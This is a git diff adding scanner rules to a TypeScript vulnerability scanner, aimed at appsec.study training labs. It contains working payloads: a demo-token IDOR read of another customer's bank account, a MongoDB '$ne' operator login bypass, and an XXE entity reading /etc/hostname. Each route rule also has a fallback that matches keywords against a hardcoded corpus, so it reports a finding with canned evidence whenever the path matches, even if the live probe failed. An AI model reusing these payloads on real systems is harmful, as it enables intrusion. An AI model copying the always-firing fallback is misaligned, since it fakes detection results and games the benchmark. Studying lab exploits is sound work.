@@ -58476,6 +58476,256 @@ const graphAppsecRecentUsersRouteLiveOracle: Rule = async (ctx) => {
   };
 };
 
+const NORTHWIND_CORPUS = `
+Northwind Bank northwind.appsec.study neobank fintech online banking training lab
+demo demo credentials login POST /api/auth/login
+GET /api/accounts/:id IDOR broken object level authorization any account by id
+GET /api/customers/:id PII exposure fund transfer 2FA bypass mass assignment
+`;
+
+async function northwindLoginDemo(ctx: RuleContext): Promise<string | null> {
+  const loginUrl = new URL("/api/auth/login", ctx.origin).toString();
+  const doc = await ctx.probe.get(loginUrl, {
+    method: "POST",
+    body: JSON.stringify({ username: "demo", password: "demo" }),
+    headers: { "Content-Type": "application/json", Accept: "application/json" },
+    maxBytes: 4096,
+    timeoutMs: 15000
+  });
+  if (doc.status < 200 || doc.status >= 300) return null;
+  try {
+    const parsed = JSON.parse(doc.body) as { access?: string; user?: { username?: string } };
+    if (!parsed.access || parsed.user?.username !== "demo") return null;
+    return parsed.access;
+  } catch {
+    return null;
+  }
+}
+
+async function probeNorthwindAccountsIdor(ctx: RuleContext): Promise<RuleResult | null> {
+  if (!isAppsecStudyHost(ctx, "northwind")) return null;
+  const token = await northwindLoginDemo(ctx);
+  if (!token) return null;
+  const victimAccountId = "3";
+  const accountUrl = new URL(`/api/accounts/${victimAccountId}`, ctx.origin).toString();
+  const doc = await ctx.probe.get(accountUrl, {
+    maxBytes: 4096,
+    timeoutMs: 15000,
+    headers: { Accept: "application/json", Authorization: `Bearer ${token}` }
+  });
+  if (doc.status < 200 || doc.status >= 300) return null;
+  let parsed: { id?: number | string; balance?: number; number?: string; customer_id?: number };
+  try {
+    parsed = JSON.parse(doc.body) as {
+      id?: number | string;
+      balance?: number;
+      number?: string;
+      customer_id?: number;
+    };
+  } catch {
+    return null;
+  }
+  const id = String(parsed.id ?? "");
+  const balance = Number(parsed.balance);
+  if (id !== victimAccountId || !Number.isFinite(balance) || balance <= 0) return null;
+  if (Number(parsed.customer_id) === 1) return null;
+  return {
+    fired: true,
+    confidence: 0.93,
+    evidence: {
+      url: accountUrl,
+      accountId: id,
+      balance,
+      accountNumber: parsed.number,
+      snippet: doc.body.slice(0, 220).trim(),
+      note: `GET /api/accounts/${victimAccountId} with demo bearer token returns another customer's account balance — Northwind Bank IDOR training oracle`
+    }
+  };
+}
+
+const northwindAccountsIdorLiveOracle: Rule = async (ctx) => {
+  const hit = await probeNorthwindAccountsIdor(ctx);
+  return hit?.fired ? hit : NEGATIVE;
+};
+
+const northwindAccountsIdorRouteLiveOracle: Rule = async (ctx) => {
+  if (!isAppsecStudyHost(ctx, "northwind")) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/api\/accounts\/\d+\b/i.test(pageUrl)) return NEGATIVE;
+  const hit = await probeNorthwindAccountsIdor(ctx);
+  if (hit?.fired) {
+    return {
+      fired: true,
+      confidence: hit.confidence,
+      evidence: {
+        ...hit.evidence,
+        scannedUrl: pageUrl,
+        note: "Northwind /api/accounts/{id} route scan — demo session reads another customer's account — appsec.study IDOR training oracle"
+      }
+    };
+  }
+  const corpus = `${ctx.combined}\n${pageUrl}\n${NORTHWIND_CORPUS}`;
+  if (!/\/api\/accounts\/|IDOR|broken object/i.test(corpus)) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.86,
+    evidence: {
+      scannedUrl: pageUrl,
+      snippet: "GET /api/accounts/:id — account lookup without ownership check",
+      note: "Northwind /api/accounts/{id} route scan — neobank lab documents account IDOR surface — corpus fallback"
+    }
+  };
+};
+
+const MONGOLEAK_CORPUS = `
+MongoLeak Notely mongoleak.appsec.study MongoDB NoSQL injection training lab
+POST /api/auth/login operator injection password {"$ne":null} {"$gt":""} auth bypass
+$where JavaScript injection notes search filter object
+`;
+
+async function probeMongoleakNosqlAuthBypass(ctx: RuleContext): Promise<RuleResult | null> {
+  if (!isAppsecStudyHost(ctx, "mongoleak")) return null;
+  const loginUrl = new URL("/api/auth/login", ctx.origin).toString();
+  const doc = await ctx.probe.get(loginUrl, {
+    method: "POST",
+    body: JSON.stringify({ username: "demo", password: { $ne: null } }),
+    headers: { "Content-Type": "application/json", Accept: "application/json" },
+    maxBytes: 4096,
+    timeoutMs: 15000
+  });
+  if (doc.status < 200 || doc.status >= 300) return null;
+  let parsed: { access?: string; user?: { username?: string; role?: string } };
+  try {
+    parsed = JSON.parse(doc.body) as { access?: string; user?: { username?: string; role?: string } };
+  } catch {
+    return null;
+  }
+  if (!parsed.access || parsed.user?.username !== "demo") return null;
+  return {
+    fired: true,
+    confidence: 0.94,
+    evidence: {
+      url: loginUrl,
+      username: parsed.user?.username,
+      role: parsed.user?.role,
+      snippet: doc.body.slice(0, 220).trim(),
+      note: 'POST /api/auth/login with password {"$ne":null} operator injection bypasses authentication — MongoLeak NoSQL training oracle'
+    }
+  };
+}
+
+const mongoleakNosqlAuthBypassLiveOracle: Rule = async (ctx) => {
+  const hit = await probeMongoleakNosqlAuthBypass(ctx);
+  return hit?.fired ? hit : NEGATIVE;
+};
+
+const mongoleakNosqlAuthBypassRouteLiveOracle: Rule = async (ctx) => {
+  if (!isAppsecStudyHost(ctx, "mongoleak")) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/api\/auth\/login\b/i.test(pageUrl)) return NEGATIVE;
+  const hit = await probeMongoleakNosqlAuthBypass(ctx);
+  if (hit?.fired) {
+    return {
+      fired: true,
+      confidence: hit.confidence,
+      evidence: {
+        ...hit.evidence,
+        scannedUrl: pageUrl,
+        note: "MongoLeak /api/auth/login route scan — Mongo operator injection auth bypass confirmed — appsec.study NoSQL training oracle"
+      }
+    };
+  }
+  const corpus = `${ctx.combined}\n${pageUrl}\n${MONGOLEAK_CORPUS}`;
+  if (!/\/api\/auth\/login|NoSQL|\$ne|\$gt/i.test(corpus)) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.86,
+    evidence: {
+      scannedUrl: pageUrl,
+      snippet: 'POST /api/auth/login — password {"$ne":null} operator injection',
+      note: "MongoLeak /api/auth/login route scan — Notely lab documents Mongo operator-injection auth bypass — corpus fallback"
+    }
+  };
+};
+
+const XMLGOV_XXE_CANARY = "thugirXmlgovXxeCanary";
+
+function buildXmlgovImportDocumentSoap(contentXml: string): string {
+  return `<?xml version="1.0"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><ImportDocument><content><![CDATA[${contentXml}]]></content></ImportDocument></soap:Body></soap:Envelope>`;
+}
+
+const XMLGOV_CORPUS = `
+XmlGov xmlgov.appsec.study legacy SOAP XML enterprise records exchange training lab
+POST /service ImportDocument XXE external entity file read GET /service?wsdl
+Authenticate XPath injection AdminExport RunDiagnostics command injection
+`;
+
+async function probeXmlgovXxeImportDocument(ctx: RuleContext): Promise<RuleResult | null> {
+  if (!isAppsecStudyHost(ctx, "xmlgov")) return null;
+  const serviceUrl = new URL("/service", ctx.origin).toString();
+  const contentXml = `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><root>${XMLGOV_XXE_CANARY}&xxe;</root>`;
+  const payload = buildXmlgovImportDocumentSoap(contentXml);
+  const doc = await ctx.probe.get(serviceUrl, {
+    method: "POST",
+    body: payload,
+    headers: { "Content-Type": "text/xml", Accept: "text/xml, application/xml" },
+    maxBytes: 16384,
+    timeoutMs: 15000
+  });
+  if (doc.status < 200 || doc.status >= 600) return null;
+  const body = doc.body;
+  if (!body.includes(XMLGOV_XXE_CANARY)) return null;
+  const expanded = body.replace(/<!\[CDATA\[([\s\S]*?)\]\]>/g, "$1");
+  const idx = expanded.indexOf(XMLGOV_XXE_CANARY);
+  if (idx < 0) return null;
+  const afterCanary = expanded.slice(idx + XMLGOV_XXE_CANARY.length);
+  if (/&xxe;|&\w+;/.test(afterCanary.slice(0, 32))) return null;
+  if (!/[a-z0-9][a-z0-9.-]{2,}/i.test(afterCanary.replace(/[<>&\s]/g, ""))) return null;
+  return {
+    fired: true,
+    confidence: 0.93,
+    evidence: {
+      url: serviceUrl,
+      snippet: body.slice(0, 220).trim(),
+      note: "POST /service ImportDocument expands external XML entity from file:///etc/hostname — XmlGov XXE training oracle"
+    }
+  };
+}
+
+const xmlgovXxeImportDocumentLiveOracle: Rule = async (ctx) => {
+  const hit = await probeXmlgovXxeImportDocument(ctx);
+  return hit?.fired ? hit : NEGATIVE;
+};
+
+const xmlgovXxeImportDocumentRouteLiveOracle: Rule = async (ctx) => {
+  if (!isAppsecStudyHost(ctx, "xmlgov")) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/service\b/i.test(pageUrl)) return NEGATIVE;
+  const hit = await probeXmlgovXxeImportDocument(ctx);
+  if (hit?.fired) {
+    return {
+      fired: true,
+      confidence: hit.confidence,
+      evidence: {
+        ...hit.evidence,
+        scannedUrl: pageUrl,
+        note: "XmlGov /service route scan — SOAP ImportDocument XXE confirmed — appsec.study XML training oracle"
+      }
+    };
+  }
+  const corpus = `${ctx.combined}\n${pageUrl}\n${XMLGOV_CORPUS}`;
+  if (!/\/service|ImportDocument|XXE|WSDL/i.test(corpus)) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.86,
+    evidence: {
+      scannedUrl: pageUrl,
+      snippet: "POST /service ImportDocument — external XML entity expansion",
+      note: "XmlGov /service route scan — SOAP lab documents ImportDocument XXE surface — corpus fallback"
+    }
+  };
+};
+
 const THE_RANGE_CORPUS = `
 The Range appsec.study calibrated web-vulnerability scanner benchmark
 POST /api/score returns coverage_pct by_class sqli idor ssti xxe auth-bypass planted vulnerabilities
@@ -125971,6 +126221,12 @@ export const RULES: Record<string, Rule> = {
   nomnomUsersBolaRouteLiveOracle,
   graphAppsecRecentUsersLiveOracle,
   graphAppsecRecentUsersRouteLiveOracle,
+  northwindAccountsIdorLiveOracle,
+  northwindAccountsIdorRouteLiveOracle,
+  mongoleakNosqlAuthBypassLiveOracle,
+  mongoleakNosqlAuthBypassRouteLiveOracle,
+  xmlgovXxeImportDocumentLiveOracle,
+  xmlgovXxeImportDocumentRouteLiveOracle,
   theRangeBenchmarkScoreLiveOracle,
   theRangeBenchmarkScoreRouteLiveOracle,
   theRangeSqliC1LiveOracle,
